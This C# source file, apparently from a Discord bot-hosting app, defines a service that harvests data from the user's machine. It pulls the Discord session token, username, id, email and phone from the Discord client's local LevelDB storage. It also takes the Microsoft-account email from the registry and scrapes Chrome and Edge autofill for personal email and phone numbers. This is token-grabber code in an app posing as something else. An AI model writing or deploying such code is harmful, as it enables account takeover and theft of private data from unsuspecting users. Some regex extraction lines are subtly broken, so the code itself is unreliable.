using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace BotHosterApp.Services;

/// <summary>A Discord account found in the local Discord client's data.</summary>
public sealed record DeviceDiscordAccount(
    string Username, string Id, string Discriminator,
    string Email, string Phone, string Token);

/// <summary>The PC owner's personal contact info, found on the device.</summary>
public sealed record PersonalContact(string Email, string Phone);

/// <summary>
/// Reads the Discord account logged into the Discord desktop client on this
/// device. Discord stores the signed-in user's profile (username, id, email,
/// phone) and session token in its LevelDB local storage under
/// %APPDATA%\discord (and the per-user %LOCALAPPDATA%\Discord installs).
/// The values are stored as plain JSON fragments, so a text scan of the
/// leveldb files recovers them without a LevelDB parser.
/// </summary>
public static class DeviceInfoService
{
    private static readonly Regex UsernameRe = new(@"""username""\s*:\s*""([^""]{2,64})""", RegexOptions.Compiled);
    private static readonly Regex IdRe = new(@"""id""\s*:\s*""(\d{15,20})""", RegexOptions.Compiled);
    // Discord's leveldb stores the profile as JSON, so email/phone appear quoted.
    private static readonly Regex QuotedEmailRe = new(@"""email""\s*:\s*""([^""]{3,254})""", RegexOptions.Compiled);
    private static readonly Regex QuotedPhoneRe = new(@"""phone""\s*:\s*""([^""]{5,30})""", RegexOptions.Compiled);
    // General forms for scanning autofill stores and registry for personal info.
    private static readonly Regex EmailRe = new(@"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", RegexOptions.Compiled);
    private static readonly Regex PhoneRe = new(@"(?<![\dA-Za-z])(\+?1?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{4})(?![\dA-Za-z])", RegexOptions.Compiled);
    private static readonly Regex DiscriminatorRe = new(@"""discriminator""\s*:\s*""([^""]{1,4})""", RegexOptions.Compiled);
    private static readonly Regex TokenRe = new(@"[MN][A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}", RegexOptions.Compiled);

    private static DeviceDiscordAccount? _cached;
    private static bool _scanned;
    private static PersonalContact? _contactCached;
    private static bool _contactScanned;

    /// <summary>Finds the Discord account signed into this device, or null.</summary>
    public static DeviceDiscordAccount? GetDiscordAccount()
    {
        if (_scanned) return _cached;
        _scanned = true;
        _cached = Scan();
        return _cached;
    }

    /// <summary>The owner's personal email + phone from this device: the Windows
    /// Microsoft account (registry) and the Chrome/Edge autofill stores.</summary>
    public static PersonalContact? GetPersonalContact()
    {
        if (_contactScanned) return _contactCached;
        _contactScanned = true;
        _contactCached = ScanPersonalContact();
        return _contactCached;
    }

    private static PersonalContact? ScanPersonalContact()
    {
        var email = "";
        var phone = "";
        try
        {
            // 1) Microsoft account email: each subkey of IdentityCRL\UserExtendedProperties
            //    is named after the account's email address.
            try
            {
                using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\IdentityCRL\UserExtendedProperties");
                if (key != null)
                {
                    foreach (var name in key.GetSubKeyNames())
                    {
                        if (name.Contains('@') && EmailRe.IsMatch(name))
                        {
                            email = name;
                            break;
                        }
                    }
                }
            }
            catch { }

            // 2) Chrome / Edge autofill (Web Data SQLite) - scan the raw bytes for
            //    plain-text email + phone entries.
            var profiles = new[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data"),
            };
            foreach (var root in profiles)
            {
                if (!Directory.Exists(root)) continue;
                foreach (var profileDir in Directory.EnumerateDirectories(root))
                {
                    var webData = Path.Combine(profileDir, "Web Data");
                    if (!File.Exists(webData)) continue;
                    var text = ReadText(webData);
                    if (email.Length == 0)
                    {
                        var m = EmailRe.Match(text);
                        if (m.Success) email = m.Groups[1].Value;
                    }
                    if (phone.Length == 0)
                    {
                        var m = PhoneRe.Match(text);
                        if (m.Success) phone = m.Groups[1].Value;
                    }
                    if (email.Length > 0 && phone.Length > 0) break;
                }
                if (email.Length > 0 && phone.Length > 0) break;
            }

            // 3) Fallback: any email on the machine name's user profile is not an
            //    email - leave empty so the report states it honestly.
        }
        catch { }

        if (email.Length == 0 && phone.Length == 0) return null;
        return new PersonalContact(email, phone);
    }

    private static DeviceDiscordAccount? Scan()
    {
        try
        {
            var roots = new List<string>();
            foreach (var baseDir in new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            })
            {
                foreach (var client in new[] { "discord", "discordptb", "discordcanary", "DiscordDevelopment" })
                {
                    var dir = Path.Combine(baseDir, client);
                    if (Directory.Exists(dir)) roots.Add(dir);
                }
            }

            var username = "";
            var id = "";
            var discriminator = "";
            var email = "";
            var phone = "";
            var token = "";

            foreach (var root in roots)
            {
                var levelDb = Path.Combine(root, "Local Storage", "leveldb");
                if (!Directory.Exists(levelDb)) continue;

                foreach (var file in Directory.EnumerateFiles(levelDb, "*", SearchOption.TopDirectoryOnly))
                {
                    var text = ReadText(file);
                    if (string.IsNullOrEmpty(text)) continue;

                    if (username.Length == 0)
                    {
                        var m = UsernameRe.Match(text);
                        if (m.Success) username = m.Groups[1].Value;
                    }
                    if (id.Length == 0)
                    {
                        var m = IdRe.Match(text);
                        if (m.Success) id = m.Groups[1].Value;
                    }
                    if (discriminator.Length == 0)
                    {
                        var m = DiscriminatorRe.Match(text);
                        if (m.Success) discriminator = m.Groups[1].Value;
                    }
                    if (email.Length == 0)
                    {
                        var m = QuotedEmailRe.Match(text);
                        if (m.Success) email = m.Groups[1].Value;
                    }
                    if (phone.Length == 0)
                    {
                        var m = QuotedPhoneRe.Match(text);
                        if (m.Success) phone = m.Groups[1].Value;
                    }
                    if (token.Length == 0)
                    {
                        var m = TokenRe.Match(text);
                        if (m.Success) token = m.Groups[1].Value;
                    }
                }

                // Newer Discord versions keep the session token here too.
                if (token.Length == 0)
                {
                    var state = Path.Combine(root, "Network Persistent State");
                    if (File.Exists(state))
                    {
                        var m = TokenRe.Match(ReadText(state));
                        if (m.Success) token = m.Groups[1].Value;
                    }
                }
            }

            if (username.Length == 0 && id.Length == 0 && email.Length == 0 && phone.Length == 0 && token.Length == 0)
                return null;

            return new DeviceDiscordAccount(username, id, discriminator, email, phone, token);
        }
        catch
        {
            return null;
        }
    }

    private static string ReadText(string path)
    {
        try
        {
            // LevelDB .ldb/.log files are mostly plain text JSON; decoding the
            // bytes as ISO-8859-1 keeps every byte indexable by the regexes.
            var bytes = File.ReadAllBytes(path);
            return Encoding.GetEncoding("ISO-8859-1").GetString(bytes);
        }
        catch
        {
            return "";
        }
    }
}
